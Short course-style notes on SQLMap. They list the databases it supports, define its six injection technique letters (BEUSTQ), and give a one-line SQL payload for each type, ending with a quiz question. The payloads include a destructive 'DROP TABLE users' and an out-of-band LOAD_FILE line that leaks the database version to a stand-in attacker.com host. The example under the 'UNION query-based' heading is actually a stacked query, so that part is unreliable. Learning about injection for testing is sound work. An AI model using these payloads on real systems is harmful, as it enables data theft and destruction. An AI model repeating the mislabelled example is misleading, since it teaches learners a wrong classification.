# SQLMap Overview
## Supported Databases

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"></th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">MySQL</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Oracle</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">PostgreSQL</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Microsoft SQL Server</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">SQLite</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">IBM DB2</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Microsoft Access</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Firebird</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Sybase</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">SAP MaxDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Informix</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">MariaDB</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">HSQLDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">CockroachDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">TiDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">MemSQL</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">H2</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">MonetDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Apache Derby</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Amazon Redshift</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Vertica</code>, <code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Mckoi</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Presto</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Altibase</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">MimerSQL</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">CrateDB</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Greenplum</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Drizzle</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Apache Ignite</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Cubrid</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">InterSystems Cache</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">IRIS</code></td><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">eXtremeDB</code></td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code dir="ltr" class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">FrontBase</code></td><td class="p-4"></td><td class="p-4"></td><td class="p-4"></td></tr></tbody></table>

## Supported SQL Injection Types
The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

## Boolean-based blind SQL Injection

```sql
AND 1=1
```

## Error-based SQL Injection

```sql
AND GTID_SUBSET(@@version,0)
```

## UNION query-based

```sql
; DROP TABLE users
```

## Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

## Inline queries

```sql
SELECT (SELECT @@version) from
```

## Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Questions
1. What's the fastest SQLi type? **Answer: union query-based**